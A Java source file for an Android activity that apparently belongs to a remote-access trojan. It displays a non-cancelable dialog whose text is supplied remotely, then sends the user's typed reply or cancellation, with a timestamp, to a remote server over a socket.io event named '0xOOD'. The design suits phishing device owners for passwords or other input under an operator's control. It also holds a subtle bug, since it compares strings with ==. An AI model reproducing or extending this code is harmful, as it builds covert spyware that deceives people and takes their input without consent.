package com.remote.app;

import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;


import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.util.Base64;
import android.util.Log;
import android.widget.EditText;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Dialog extends Activity {
	 
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent sender=getIntent();
        final String title = sender.getExtras().getString("Title");
        final String message = sender.getExtras().getString("Message");

        AlertDialog.Builder alert = new AlertDialog.Builder(this);                 
        alert.setTitle(title);  
        alert.setMessage(message);                

         final EditText input = new EditText(this); 
         alert.setView(input);



         alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
         public void onClick(DialogInterface dialog, int whichButton) {

             String value = "{Cancel}";
             JSONObject dia = new JSONObject();
             JSONArray array = new JSONArray();

             try {
                 dia.put("title",title);
                 dia.put("msg",message);
                 dia.put("otv",value);
                 dia.put("date",new Date().getTime());
                 array.put(dia);
                 dia= new JSONObject();
                 dia.put("dialog",array);
             } catch (JSONException e) {
                 e.printStackTrace();
             }

             IOSocket.getInstance().getIoSocket().emit("0xOOD",dia);

        	 finish();
             return;                  
            }  
          });  
         
          alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {  
          public void onClick(DialogInterface dialog, int whichButton) {  
              String value = input.getText().toString();
              if(value=="")
                  value = "{k}";
              JSONObject dia = new JSONObject();
              JSONArray array = new JSONArray();

              try {
                  dia.put("title",title);
                  dia.put("msg",message);
                  dia.put("otv",value);
                  dia.put("date",new Date().getTime());
                  array.put(dia);
                  dia= new JSONObject();
                  dia.put("dialog",array);
              } catch (JSONException e) {
                  e.printStackTrace();
              }

              IOSocket.getInstance().getIoSocket().emit("0xOOD",dia);

         	  finish();
              return;                  
             }  
           });
            
          alert.setCancelable(false);
          alert.show();
    }

    //********************************************************************************************************************************************************
    public boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            return true;
        }
        return false;
    } 
}